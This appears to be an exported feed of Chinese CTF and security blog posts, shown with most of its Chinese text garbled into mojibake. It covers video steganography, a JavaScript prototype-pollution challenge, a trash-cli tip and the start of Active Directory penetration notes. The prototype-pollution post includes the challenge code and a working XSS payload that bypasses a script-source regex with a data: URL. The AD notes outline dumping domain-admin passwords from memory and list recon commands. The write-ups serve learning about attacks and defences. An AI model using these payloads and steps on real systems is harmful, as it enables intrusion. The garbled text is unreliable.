boxï¼Œå¯ä»¥æœ‰å¾ˆå¤šä¸ªï¼Œä¹Ÿå¯ä»¥æ²¡æœ‰ï¼ˆå½“åª’ä½“æ•°æ®å…¨éƒ¨å¼•ç”¨å…¶ä»–æ–‡ä»¶æ—¶ï¼‰ï¼Œåª’ä½“æ•°æ®çš„ç»“æ„ç”±metadataè¿›è¡Œæè¿°ã€‚</p></blockquote><p><img src="https://i.loli.net/2020/02/19/NVA3PtERXBqfwcd.png" alt="image622"></p><p>å›¾ä¸­æ–¹æ¡†å³ä¸ºç¬¬ä¸€ä¸ªboxçš„head,åŸæœ¬åº”è¯¥æ˜¯<code>ftyp(0x66747970)</code>è€Œè¿™é‡Œç¡®å®<code>66459707</code>,ä½ç½®åäº†</p><p>æ¢å¤è„šæœ¬</p><pre><code class="python">with open(&#39;NBA.mp4&#39;, &#39;rb&#39;) as f:    keydata =f.read()t= keydata.encode(&quot;hex&quot;)l=len(t)t2=&quot;&quot;for i in range(0,l,2):    a=t[i]    b=t[i+1]    t2+=b    t2+=aprint t2[:100]t2=t2.decode(&quot;hex&quot;)f2 = open(&#39;NBA2.mp4&#39;, &#39;wb&#39;)f2.write(t2)</code></pre><p>ç­‰è„šæœ¬è·‘å®ŒåæˆåŠŸæ¢å¤åŸæ¥çš„è§†é¢‘æ–‡ä»¶</p><p>è§†é¢‘éšå†™é€šå¸¸æŠŠå†…å®¹å­˜å‚¨åœ¨è§†é¢‘ä¸­çš„æŸä¸ªå›¾ç‰‡,æˆ‘ä»¬ç”¨ ffmpeg ,å°†è§†é¢‘åˆ†ç¦»æˆå›¾ç‰‡</p><p><code>ffmpeg -i NBA2.mp4 -f image2 image%d.jpg</code></p><p>ä¸€å¼ ä¸€å¼ çœ‹è¿‡å»,æˆ‘ä»¬å‘ç°,åœ¨ç¬¬3028å¼ çªç„¶å…¨é»‘äº†</p><p><img src="https://i.loli.net/2020/02/20/Q9dsOuiVGFgwAcm.png" alt="image1136"></p><p>è°ƒæ•´ä¸€ä¸‹å›¾ç‰‡çš„å¯¹æ¯”å¯¹,è·‘å‡ºä¸€ä¸ªäºŒç»´ç </p><p><img src="https://i.loli.net/2020/02/20/aE3PpqcrJzn852V.png" alt="image1223"></p><p><code>flag{I_l0v3_pl4ying_b4sk3tb4ll}</code></p><p><strong>æœ¬æ–‡ä½œè€…</strong>ï¼šccreater<br/><strong>æœ¬æ–‡åœ°å€</strong>ï¼š <a href="http://blog.ccreater.top/2020/02/20/æŸmisc/">http://blog.ccreater.top/2020/02/20/æŸmisc/</a> <br/><strong>ç‰ˆæƒå£°æ˜</strong>ï¼šæœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ BY-NC-SA è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜å‡ºå¤„</p>]]></content>
      
      
      <categories>
          
          <category> åšé¢˜ç¬”è®° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>jsåŸå‹é“¾æ±¡æŸ“</title>
      <link href="/2020/02/18/js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/"/>
      <url>/2020/02/18/js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/</url>
      
        <content type="html"><![CDATA[<h1 id="jsåŸå‹é“¾æ±¡æŸ“"><a href="#jsåŸå‹é“¾æ±¡æŸ“" class="headerlink" title="jsåŸå‹é“¾æ±¡æŸ“"></a>jsåŸå‹é“¾æ±¡æŸ“</h1><p> <a href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html</a> </p><h2 id="ä»€ä¹ˆæ˜¯åŸå‹é“¾"><a href="#ä»€ä¹ˆæ˜¯åŸå‹é“¾" class="headerlink" title="ä»€ä¹ˆæ˜¯åŸå‹é“¾"></a>ä»€ä¹ˆæ˜¯åŸå‹é“¾</h2><p> æ¯ä¸ªå®ä¾‹å¯¹è±¡ï¼ˆ object ï¼‰éƒ½æœ‰ä¸€ä¸ªç§æœ‰å±æ€§ï¼ˆç§°ä¹‹ä¸º <strong>proto</strong> ï¼‰æŒ‡å‘å®ƒçš„æ„é€ å‡½æ•°çš„åŸå‹å¯¹è±¡ï¼ˆ<strong>prototype</strong> ï¼‰ã€‚è¯¥åŸå‹å¯¹è±¡ä¹Ÿæœ‰ä¸€ä¸ªè‡ªå·±çš„åŸå‹å¯¹è±¡( <strong>proto</strong> ) ï¼Œå±‚å±‚å‘ä¸Šç›´åˆ°ä¸€ä¸ªå¯¹è±¡çš„åŸå‹å¯¹è±¡ä¸º <code>null</code>ã€‚æ ¹æ®å®šä¹‰ï¼Œ<code>null</code> æ²¡æœ‰åŸå‹ï¼Œå¹¶ä½œä¸ºè¿™ä¸ª<strong>åŸå‹é“¾</strong>ä¸­çš„æœ€åä¸€ä¸ªç¯èŠ‚ã€‚ </p><pre><code class="javascript">function Foo{    this.a=&quot;456&quot;;    this.c=&quot;777&quot;}Foo.prototype.b=&quot;123&quot;;Foo.prototype.c=&quot;789&quot;;var foo=new Foo();console.log(foo.a);//456    console.log(foo.b);//123console.log(foo.c);//777</code></pre><p>å½“åœ¨å½“å‰å¯¹è±¡æ‰¾ä¸åˆ°å±æ€§æˆ–æ–¹æ³•æ—¶ä¾¿ä¼šå‘ä¸Š(<code>__proto__</code>ä¸­)å¯»æ‰¾</p><ol><li>åœ¨å¯¹è±¡fooä¸­å¯»æ‰¾b</li><li>å¦‚æœæ‰¾ä¸åˆ°ï¼Œåˆ™åœ¨<code>foo.__proto__</code>ä¸­å¯»æ‰¾b</li><li>å¦‚æœä»ç„¶æ‰¾ä¸åˆ°ï¼Œåˆ™ç»§ç»­åœ¨<code>foo.__proto__.__proto__</code>ä¸­å¯»æ‰¾b</li><li>ä¾æ¬¡å¯»æ‰¾ï¼Œç›´åˆ°æ‰¾åˆ°<code>null</code>ç»“æŸã€‚æ¯”å¦‚ï¼Œ<code>Object.prototype</code>çš„<code>__proto__</code>å°±æ˜¯<code>null</code></li></ol><p>JavaScriptçš„è¿™ä¸ªæŸ¥æ‰¾çš„æœºåˆ¶ï¼Œè¢«è¿ç”¨åœ¨é¢å‘å¯¹è±¡çš„ç»§æ‰¿ä¸­ï¼Œè¢«ç§°ä½œprototypeç»§æ‰¿é“¾ã€‚</p><p>ä»¥ä¸Šå°±æ˜¯æœ€åŸºç¡€çš„JavaScripté¢å‘å¯¹è±¡ç¼–ç¨‹ï¼Œæˆ‘ä»¬å¹¶ä¸æ·±å…¥ç ”ç©¶æ›´ç»†èŠ‚çš„å†…å®¹ï¼Œåªè¦ç‰¢è®°ä»¥ä¸‹å‡ ç‚¹å³å¯ï¼š</p><ol><li>æ¯ä¸ªæ„é€ å‡½æ•°(constructor)éƒ½æœ‰ä¸€ä¸ªåŸå‹å¯¹è±¡(prototype)</li><li>å¯¹è±¡çš„<code>__proto__</code>å±æ€§ï¼ŒæŒ‡å‘ç±»çš„åŸå‹å¯¹è±¡<code>prototype</code></li><li>JavaScriptä½¿ç”¨prototypeé“¾å®ç°ç»§æ‰¿æœºåˆ¶</li></ol><h2 id="ä»€ä¹ˆæ—¶åŸå‹é“¾æ±¡æŸ“"><a href="#ä»€ä¹ˆæ—¶åŸå‹é“¾æ±¡æŸ“" class="headerlink" title="ä»€ä¹ˆæ—¶åŸå‹é“¾æ±¡æŸ“"></a>ä»€ä¹ˆæ—¶åŸå‹é“¾æ±¡æŸ“</h2><p>å½“æˆ‘ä»¬ä¿®æ”¹å¯¹è±¡çš„<code>__proto__</code>å±æ€§æ—¶,å°±ç›¸å½“äºä¿®æ”¹å¯¹è±¡çš„çˆ¶ç±»</p><p>å½“è°ƒç”¨ä¸å­˜åœ¨çš„æ–¹æ³•æˆ–å±æ€§æ—¶ä¾¿ä¼šåœ¨çˆ¶ç±»ä¸­å¯»æ‰¾,å°±å˜ç›¸çš„æ§åˆ¶äº†è¿™ä¸ªç±»</p><pre><code class="javascript">let foo = {bar: 1}// foo.bar æ­¤æ—¶ä¸º1console.log(foo.bar)// ä¿®æ”¹fooçš„åŸå‹ï¼ˆå³Objectï¼‰foo.__proto__.bar = 2// ç”±äºæŸ¥æ‰¾é¡ºåºçš„åŸå› ï¼Œfoo.barä»ç„¶æ˜¯1console.log(foo.bar)// æ­¤æ—¶å†ç”¨Objectåˆ›å»ºä¸€ä¸ªç©ºçš„zooå¯¹è±¡let zoo = {}// æŸ¥çœ‹zoo.barconsole.log(zoo.bar)</code></pre><h2 id="å“ªäº›æƒ…å†µåŸå‹é“¾ä¼šè¢«æ±¡æŸ“"><a href="#å“ªäº›æƒ…å†µåŸå‹é“¾ä¼šè¢«æ±¡æŸ“" class="headerlink" title="å“ªäº›æƒ…å†µåŸå‹é“¾ä¼šè¢«æ±¡æŸ“"></a>å“ªäº›æƒ…å†µåŸå‹é“¾ä¼šè¢«æ±¡æŸ“</h2><h3 id="merge"><a href="#merge" class="headerlink" title="merge"></a>merge</h3><h3 id="clone"><a href="#clone" class="headerlink" title="clone"></a>clone</h3><h3 id="JSON-parse"><a href="#JSON-parse" class="headerlink" title="JSON.parse"></a>JSON.parse</h3><h3 id="jQuery-extend"><a href="#jQuery-extend" class="headerlink" title="jQuery.extend"></a>jQuery.extend</h3><p><em>$</em>.extend( target [, object1 ] [, objectN ] )</p><p>æŒ‡ç¤ºæ˜¯å¦æ·±åº¦åˆå¹¶</p><p><em>$</em>.extend( [deep ], target, object1 [, objectN ] )</p><p><strong>è­¦å‘Š:</strong> ä¸æ”¯æŒç¬¬ä¸€ä¸ªå‚æ•°ä¼ é€’ false ã€‚</p><table><thead><tr><th align="left">å‚æ•°</th><th align="left">æè¿°</th></tr></thead><tbody><tr><td align="left"><em>deep</em></td><td align="left">å¯é€‰ã€‚ Booleanç±»å‹ æŒ‡ç¤ºæ˜¯å¦æ·±åº¦åˆå¹¶å¯¹è±¡ï¼Œé»˜è®¤ä¸ºfalseã€‚å¦‚æœè¯¥å€¼ä¸ºtrueï¼Œä¸”å¤šä¸ªå¯¹è±¡çš„æŸä¸ªåŒåå±æ€§ä¹Ÿéƒ½æ˜¯å¯¹è±¡ï¼Œåˆ™è¯¥â€å±æ€§å¯¹è±¡â€çš„å±æ€§ä¹Ÿå°†è¿›è¡Œåˆå¹¶ã€‚</td></tr><tr><td align="left"><em>target</em></td><td align="left">Objectç±»å‹ ç›®æ ‡å¯¹è±¡ï¼Œå…¶ä»–å¯¹è±¡çš„æˆå‘˜å±æ€§å°†è¢«é™„åŠ åˆ°è¯¥å¯¹è±¡ä¸Šã€‚</td></tr><tr><td align="left"><em>object1</em></td><td align="left">å¯é€‰ã€‚ Objectç±»å‹ ç¬¬ä¸€ä¸ªè¢«åˆå¹¶çš„å¯¹è±¡ã€‚</td></tr><tr><td align="left"><em>objectN</em></td><td align="left">å¯é€‰ã€‚ Objectç±»å‹ ç¬¬Nä¸ªè¢«åˆå¹¶çš„å¯¹è±¡ã€‚</td></tr></tbody></table><h2 id="ä¾‹é¢˜"><a href="#ä¾‹é¢˜" class="headerlink" title="ä¾‹é¢˜"></a>ä¾‹é¢˜</h2><p>é¢˜ç›®ä»£ç </p><p>car.class.js</p><pre><code class="javascript">class Car {    constructor(type, model, color, pic, key=&quot;&quot;) {        this.type = type        this.model = model        this.color = color        this.key = key        this.pic = pic        let started = false        this.start = () =&gt; {            started = true        }        this.isStarted = () =&gt; {            return started        }    }    powerOn() {        if (this.isStarted()) {            infobox(`Well Done!`)            nextCar()        } else {            $(&#39;.chargeup&#39;)[0].play()        }    }    info() {        infobox(`This car is a ${this.type} ${this.model} in ${this.color}. It looks very nice! But it seems to be broken ...`)    }    repair() {        if(urlParams.has(&#39;repair&#39;)) {            $.extend(true, this, JSON.parse(urlParams.get(&#39;repair&#39;)))        }    }    light() {        infobox(`You turn on the lights ... Nothing happens.`)    }    battery() {        infobox(`Hmmm, the battery is almost empty ... Maybe i can repair this somehow.`)    }    ignition() {        if (this.key == &quot;&quot;) {            infobox(`Looks like the key got lost. No wonder the car is not starting ...`)        }        if (this.key == &quot;ğŸ”‘&quot;) {            infobox(`The car started!`)            this.start()        }    }}</code></pre><p>util.js</p><pre><code class="javascript">const urlParams = new URLSearchParams(window.location.search)const h = location.hash.slice(1)const bugatti = new Car(&#39;Bugatti&#39;, &#39;T35&#39;, &#39;green&#39;, &#39;assets/images/bugatti.png&#39;)const porsche = new Car(&#39;Porsche&#39;, &#39;911&#39;, &#39;yellow&#39;, &#39;assets/images/porsche.png&#39;)const cars = [bugatti, porsche]porsche.repair = () =&gt; {    if(!bugatti.isStarted()){        infobox(`Not so fast. Repair the other car first!`)    }    else if($.md5(porsche) == &#39;9cdfb439c7876e703e307864c9167a15&#39;){        if(urlParams.has(&#39;help&#39;)) {            repairWithHelper(urlParams.get(&#39;help&#39;))        }    }    else{        infobox(`Repairing this is not that easy.`)    }}porsche.ignition = () =&gt; {    infobox(`Hmm ... WTF!`)}$(document).ready(() =&gt; {    const [car] = cars    $(&#39;.fa-power-off&#39;).click(() =&gt; car.powerOn())    $(&#39;.fa-car&#39;).click(() =&gt; car.info())    $(&#39;.fa-lightbulb-o&#39;).click(() =&gt; car.light())    $(&#39;.fa-battery-quarter&#39;).click(() =&gt; car.battery())    $(&#39;.fa-key&#39;).click(() =&gt; car.ignition())    $(&#39;.fa-wrench&#39;).click(() =&gt; car.repair())    $(&#39;.fa-step-forward&#39;).click(() =&gt; nextCar())    if(h.includes(&#39;Bugatti&#39;))        autoStart(bugatti)    if(h.includes(&#39;Porsche&#39;))        autoStart(porsche)})const nextCar = () =&gt; {    cars.push(cars.shift())    $(&quot;.image&quot;).attr(&#39;src&#39;, cars[0].pic);}const autoStart = (car) =&gt; {    car.repair()    car.ignition()    car.powerOn()}const repairWithHelper = (src) =&gt; {    /* who needs csp anyways !? */    urlRegx = /^\w{4,5}:\/\/car-repair-shop\.fluxfingersforfuture\.fluxfingers\.net\/[\w\d]+\/.+\.js$/;    if (urlRegx.test(src)) {        let s = document.createElement(&#39;script&#39;)        s.src = src        $(&#39;head&#39;).append(s)    }}const infobox = (text) =&gt; {    $(&#39;a&#39;).css({&#39;pointer-events&#39;: &#39;none&#39;, &#39;border&#39;: &#39;none&#39;})    $(&#39;.infobox&#39;).addClass(&#39;infoAnimate&#39;)        .text(text)        .on(&#39;animationend&#39;, function() {            $(this).removeClass(&#39;infoAnimate&#39;)            $(&#39;a&#39;).css({&#39;pointer-events&#39;: &#39;all&#39;, &#39;border&#39;: &#39;solid 1px rgba(255, 255, 255, .25)&#39;})    })}</code></pre><p>é˜…è¯»ä»£ç å‘ç°carç±»çš„repairæ–¹æ³•ä¼šè°ƒç”¨</p><p><code>$.extend(true, this, JSON.parse(urlParams.get(&#39;repair&#39;)))</code></p><p>å¯ä»¥è¿›è¡ŒåŸå‹é“¾æ±¡æŸ“</p><p>è€Œè¿™ä¸€é¢˜æˆ‘ä»¬çš„ç›®æ ‡æ—¶è¿›è¡Œxss</p><p>é˜…è¯»ä»£ç å‘ç°å¯¹è±¡<code>porsche</code>çš„repairWithHelperä¸­å¯ä»¥è¿›è¡Œxss</p><p>è€Œè°ƒç”¨repairWithHelperæ–¹æ³•å°±éœ€è¦è°ƒç”¨porscheçš„repairæ–¹æ³•</p><pre><code>if($.md5(porsche) == &#39;9cdfb439c7876e703e307864c9167a15&#39;){        if(urlParams.has(&#39;help&#39;)) {            repairWithHelper(urlParams.get(&#39;help&#39;))        }}</code></pre><p>æˆ‘ä»¬ç”¨æ§åˆ¶porsche.toString()==â€™lolâ€™(lolçš„md5æ˜¯9cdfb439c7876e703e307864c9167a15)ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡åŸå‹é“¾æ±¡æŸ“æ¥è®©ä¸Šå±‚ä¸º<code>[&#39;lol&#39;]</code>([â€˜lolâ€™].toString()==â€™lolâ€™)</p><p>é€šè¿‡autoStartæ¥è°ƒç”¨bugatti.repair(åŸå‹é“¾æ±¡æŸ“)å’Œporsche.repair(è°ƒç”¨repairWithHelperæ–¹æ³•)</p><p>æ‰€ä»¥æ„é€ payload:<code>http://127.0.0.1/?repair={&quot;started&quot;:true,&quot;__proto__&quot;:{&quot;__proto__&quot;:[&quot;lol&quot;]}}</code></p><p>æ¥ä¸‹æ¥å°±æ˜¯åˆ©ç”¨repairWithHelperæ¥è¿›è¡Œxss</p><pre><code class="javascript">const repairWithHelper = (src) =&gt; {    /* who needs csp anyways !? */    urlRegx = /^\w{4,5}:\/\/car-repair-shop\.fluxfingersforfuture\.fluxfingers\.net\/[\w\d]+\/.+\.js$/;    if (urlRegx.test(src)) {        let s = document.createElement(&#39;script&#39;)        s.src = src        $(&#39;head&#39;).append(s)    }}</code></pre><p>è™½ç„¶è¿™é‡Œå¯¹urlçš„åŸŸåè¿›è¡Œäº†é™åˆ¶ä¸èƒ½è¿œç¨‹æ–‡ä»¶åŒ…å«</p><p>ä½†æ˜¯æˆ‘ä»¬å¯ä»¥åˆ©ç”¨dataåè®®æ¥ç»•è¿‡æ­£åˆ™ä»è€Œç›´æ¥æ‰§è¡Œå‘½ä»¤</p><p>dataåè®®æ ¼å¼</p><pre><code>data:[&lt;mime type&gt;][;charset=&lt;charset&gt;][;base64],&lt;encoded data&gt;</code></pre><p>æœ€åçš„payload:<code>http://127.0.0.1/?repair={&quot;key&quot;:&quot;ğŸ”‘&quot;,&quot;__proto__&quot;:{&quot;__proto__&quot;:[&quot;lol&quot;]}}&amp;help=data://car-repair-shop.fluxfingersforfuture.fluxfingers.net/asdfsdf/asdf,alert(&quot;123&quot;)%23.js#BugattiPorsche</code></p><p><strong>æœ¬æ–‡ä½œè€…</strong>ï¼šccreater<br/><strong>æœ¬æ–‡åœ°å€</strong>ï¼š <a href="http://blog.ccreater.top/2020/02/18/jsåŸå‹é“¾æ±¡æŸ“/">http://blog.ccreater.top/2020/02/18/jsåŸå‹é“¾æ±¡æŸ“/</a> <br/><strong>ç‰ˆæƒå£°æ˜</strong>ï¼šæœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ BY-NC-SA è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜å‡ºå¤„</p>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>é¿å…rm -rf *çš„æ‚²æƒ¨å‘½è¿</title>
      <link href="/2020/02/17/%E9%81%BF%E5%85%8Drm-rf-%E7%9A%84%E6%82%B2%E6%83%A8%E5%91%BD%E8%BF%90/"/>
      <url>/2020/02/17/%E9%81%BF%E5%85%8Drm-rf-%E7%9A%84%E6%82%B2%E6%83%A8%E5%91%BD%E8%BF%90/</url>
      
        <content type="html"><![CDATA[<h1 id="é¿å…rm-rf-çš„æ‚²æƒ¨å‘½è¿"><a href="#é¿å…rm-rf-çš„æ‚²æƒ¨å‘½è¿" class="headerlink" title="é¿å…rm -rf *çš„æ‚²æƒ¨å‘½è¿"></a>é¿å…rm -rf *çš„æ‚²æƒ¨å‘½è¿</h1><p>ä»Šå¤©åˆæ˜¯æ‚²æƒ¨çš„ä¸€å¤©,æ²¡è®¤çœŸçœ‹,rm -rf *é”™åœ°æ–¹äº†</p><p>ä¸ºäº†å†æ¬¡é¿å…æ‚²æƒ¨å‘½è¿</p><ol><li><p>è¿˜æ˜¯ä¸è¦è€æ˜¯ç”¨rootç”¨æˆ·äº†,åˆ›ä¸ªæ—¥å¸¸çš„ä½æƒé™ç”¨æˆ·,æœ‰å¿…è¦æ—¶å†ç™»é™†root</p></li><li><p>åˆ«ç”¨rm å•¦,æ”¹ç”¨trashå§</p></li></ol><h2 id="å®‰è£…trash-cli"><a href="#å®‰è£…trash-cli" class="headerlink" title="å®‰è£…trash-cli"></a>å®‰è£…trash-cli</h2><p><code>apt-get install trash-cli</code></p><p><code>echo alias rm=trash &gt;&gt; ~/.zshrc</code></p><p><code>source ~/.zshrc</code> </p><h2 id="trash-cli-å‘½ä»¤"><a href="#trash-cli-å‘½ä»¤" class="headerlink" title="trash-cli å‘½ä»¤"></a>trash-cli å‘½ä»¤</h2><table><thead><tr><th>command</th><th>explain</th></tr></thead><tbody><tr><td>trash-put/trash</td><td>å°†æ–‡ä»¶æˆ–ç›®å½•æ”¾è¿›å›æ”¶ç«™</td></tr><tr><td>trash-empty</td><td>æ¸…ç©ºå›æ”¶ç«™</td></tr><tr><td>trash-list</td><td>åˆ—å‡ºå›æ”¶ç«™ä¸­çš„æ–‡ä»¶</td></tr><tr><td>restore-trash</td><td>è¿˜åŸå›æ”¶ç«™ä¸­çš„æ–‡ä»¶</td></tr><tr><td>trash-rm</td><td>åˆ é™¤å›æ”¶ç«™ä¸­çš„å•ä¸ªæ–‡ä»¶</td></tr></tbody></table><h2 id="åƒåœ¾ç«™æ‰€åœ¨ä½ç½®"><a href="#åƒåœ¾ç«™æ‰€åœ¨ä½ç½®" class="headerlink" title="åƒåœ¾ç«™æ‰€åœ¨ä½ç½®"></a>åƒåœ¾ç«™æ‰€åœ¨ä½ç½®</h2><p><code>~/.local/share/Trash/files</code></p><p><strong>æœ¬æ–‡ä½œè€…</strong>ï¼šccreater<br/><strong>æœ¬æ–‡åœ°å€</strong>ï¼š <a href="http://blog.ccreater.top/2020/02/17/é¿å…rm-rf-çš„æ‚²æƒ¨å‘½è¿/">http://blog.ccreater.top/2020/02/17/é¿å…rm-rf-çš„æ‚²æƒ¨å‘½è¿/</a> <br/><strong>ç‰ˆæƒå£°æ˜</strong>ï¼šæœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ BY-NC-SA è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜å‡ºå¤„</p>]]></content>
      
      
      
        <tags>
            
            <tag> æ‚ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åŸŸæ¸—é€</title>
      <link href="/2020/02/17/%E5%9F%9F%E6%B8%97%E9%80%8F/"/>
      <url>/2020/02/17/%E5%9F%9F%E6%B8%97%E9%80%8F/</url>
      
        <content type="html"><![CDATA[<h1 id="åŸŸæ¸—é€å­¦ä¹ ç¬”è®°"><a href="#åŸŸæ¸—é€å­¦ä¹ ç¬”è®°" class="headerlink" title="åŸŸæ¸—é€å­¦ä¹ ç¬”è®°"></a>åŸŸæ¸—é€å­¦ä¹ ç¬”è®°</h1><h2 id="åè¯-ç¼©å†™"><a href="#åè¯-ç¼©å†™" class="headerlink" title="åè¯/ç¼©å†™"></a>åè¯/ç¼©å†™</h2><p> æ´»åŠ¨ç›®å½•ï¼ˆActive Directoryï¼‰ï¼ŒADï¼šæ´»åŠ¨ç›®å½•æ˜¯WindowsServeråœ¨ç½‘ç»œç¯å¢ƒä¸­æä¾›çš„â€œèµ„æºç›®å½•â€ã€‚æ´»åŠ¨ç›®å½•æ˜¯å‚¨å­˜ç€åŸŸä¸­ç›¸å…³èµ„æºä¿¡æ¯çš„ç›®å½•ï¼Œä¾‹å¦‚è®¡ç®—æœºï¼Œç”¨æˆ·ç»„ï¼Œæ•°æ®åº“ï¼ŒæœåŠ¡å™¨ï¼Œæ‰“å°æœºï¼Œç”¨æˆ·å±æ€§ï¼ˆæƒé™ç­‰ï¼‰ï¼Œå°±åƒä¸€ä¸ªæ•°æ®åº“ã€‚<br>åŸŸæ§ï¼ˆDomain Controllerï¼‰ï¼ŒDCï¼šå®‰è£…äº†ADçš„æœåŠ¡å™¨å°±æ˜¯åŸŸæ§åˆ¶å™¨ï¼Œå³æœ‰ADçš„è®¡ç®—æœºå°±æ˜¯DCã€‚ </p><h2 id="ä»€ä¹ˆæ˜¯åŸŸ"><a href="#ä»€ä¹ˆæ˜¯åŸŸ" class="headerlink" title="ä»€ä¹ˆæ˜¯åŸŸ"></a>ä»€ä¹ˆæ˜¯åŸŸ</h2><p> å°†ç½‘ç»œä¸­å¤šå°è®¡ç®—æœºé€»è¾‘ä¸Šç»„ç»‡åˆ°ä¸€èµ·ï¼Œè¿›è¡Œé›†ä¸­ç®¡ç†ï¼Œè¿™ç§åŒºåˆ«äºå·¥ä½œç»„çš„é€»è¾‘ç¯å¢ƒå«åšåŸŸï¼ŒåŸŸæ˜¯ç»„ç»‡ä¸å­˜å‚¨èµ„æºçš„æ ¸å¿ƒç®¡ç†å•å…ƒï¼Œåœ¨åŸŸä¸­ï¼Œè‡³å°‘æœ‰ä¸€å°åŸŸæ§åˆ¶å™¨ï¼ŒåŸŸæ§åˆ¶å™¨ä¸­ä¿å­˜ç€æ•´ä¸ªåŸŸçš„ç”¨æˆ·å¸å·å’Œå®‰å…¨æ•°æ®åº“ã€‚ </p><h2 id="åŸŸçš„ç‰¹ç‚¹"><a href="#åŸŸçš„ç‰¹ç‚¹" class="headerlink" title="åŸŸçš„ç‰¹ç‚¹"></a>åŸŸçš„ç‰¹ç‚¹</h2><p> åŸŸæˆå‘˜è®¡ç®—æœºåœ¨ç™»å½•çš„æ—¶å€™å¯ä»¥é€‰æ‹©ç™»å½•åˆ°åŸŸä¸­æˆ–æ­¤è®¡ç®—æœºï¼Œç™»é™†åˆ°åŸŸä¸­çš„æ—¶å€™ï¼Œèº«ä»½éªŒè¯æ˜¯é‡‡ç”¨Kerberosåè®®åœ¨åŸŸæ§åˆ¶å™¨ä¸Šè¿›è¡Œçš„ï¼Œç™»é™†åˆ°æ­¤è®¡ç®—æœºåˆ™æ˜¯é€šè¿‡SAMæ¥è¿›è¡ŒNTLMéªŒè¯çš„</p><p> é»˜è®¤æƒ…å†µä¸‹ï¼ŒåŸŸç”¨æˆ·å¯ä»¥ç™»å½•åˆ°åŸŸä¸­æ‰€æœ‰çš„å·¥ä½œç«™ï¼Œä¸åŒ…æ‹¬åŸŸæ§åˆ¶å™¨ï¼Œç®¡ç†å‘˜ä¹Ÿå¯ä»¥æŒ‡å®šå…·ä½“çš„è®¡ç®—æœºï¼ŒåŸŸç”¨æˆ·ä¿¡æ¯ä¿å­˜åœ¨æ´»åŠ¨ç›®å½•ä¸­</p><h2 id="ä¸€äº›å…¶ä»–å…³äºåŸŸçš„çŸ¥è¯†"><a href="#ä¸€äº›å…¶ä»–å…³äºåŸŸçš„çŸ¥è¯†" class="headerlink" title="ä¸€äº›å…¶ä»–å…³äºåŸŸçš„çŸ¥è¯†"></a>ä¸€äº›å…¶ä»–å…³äºåŸŸçš„çŸ¥è¯†</h2><h3 id="DNSå®šä½åŸŸæ§åˆ¶å™¨"><a href="#DNSå®šä½åŸŸæ§åˆ¶å™¨" class="headerlink" title="DNSå®šä½åŸŸæ§åˆ¶å™¨"></a>DNSå®šä½åŸŸæ§åˆ¶å™¨</h3><p>DNSè´Ÿè´£å°†åŸŸåè§£ææˆIPåœ°å€</p><p>å†…ç½‘çš„DNSåˆ™å¯ä»¥å®šä½DCï¼ŒåŸŸä¼šæœ‰åç§°ï¼Œæ¯”å¦‚domaintestã€‚åŸŸä¼šå‘DNSæ³¨å†Œè¿™ä¸ªåç§°ï¼Œå³SRVè®°å½•ã€‚åŸŸä¸­çš„è®¡ç®—æœºè®¿é—®SRVæ¥è¿›è€Œè®¿é—®DCã€‚</p><p>é€šå¸¸DNSå’ŒDCä¼šå®‰è£…åœ¨åŒä¸€è®¡ç®—æœºä¸Šï¼Œå› è€Œæ­¤è®¡ç®—çš„æœ¬åœ°è¿æ¥DNSè¦æŒ‡å‘è‡ªèº«ã€‚</p><h2 id="åŸŸæ¸—é€æ€è·¯"><a href="#åŸŸæ¸—é€æ€è·¯" class="headerlink" title="åŸŸæ¸—é€æ€è·¯"></a>åŸŸæ¸—é€æ€è·¯</h2><p> é€šè¿‡åŸŸæˆå‘˜ä¸»æœºï¼Œå®šä½å‡ºåŸŸæ§åˆ¶å™¨IPåŠåŸŸç®¡ç†å‘˜è´¦å·ï¼Œåˆ©ç”¨åŸŸæˆå‘˜ä¸»æœºä½œä¸ºè·³æ¿ï¼Œæ‰©å¤§æ¸—é€èŒƒå›´ï¼Œåˆ©ç”¨åŸŸç®¡ç†å‘˜å¯ä»¥ç™»é™†åŸŸä¸­ä»»ä½•æˆå‘˜ä¸»æœºçš„ç‰¹æ€§ï¼Œå®šä½å‡ºåŸŸç®¡ç†å‘˜ç™»é™†è¿‡çš„ä¸»æœºIPï¼Œè®¾æ³•ä»<strong>åŸŸæˆå‘˜ä¸»æœºå†…å­˜ä¸­</strong>dumpå‡ºåŸŸç®¡ç†å‘˜å¯†ç ï¼Œè¿›è€Œæ‹¿ä¸‹åŸŸæ§åˆ¶å™¨ã€æ¸—é€æ•´ä¸ªå†…ç½‘ã€‚ </p><h2 id="åŸŸæ¸—é€å¸¸ç”¨å‘½ä»¤"><a href="#åŸŸæ¸—é€å¸¸ç”¨å‘½ä»¤" class="headerlink" title="åŸŸæ¸—é€å¸¸ç”¨å‘½ä»¤"></a>åŸŸæ¸—é€å¸¸ç”¨å‘½ä»¤</h2><h3 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h3><pre><code>dsquery server #å¾—åˆ°åŸŸæ§åˆ¶å™¨çš„IP</code></pre><p><img src="http://www.xmrseo.com/content/uploadfile/201805/dad51527168524.jpg" alt="image886"></p><p><code>net group &quot;domain 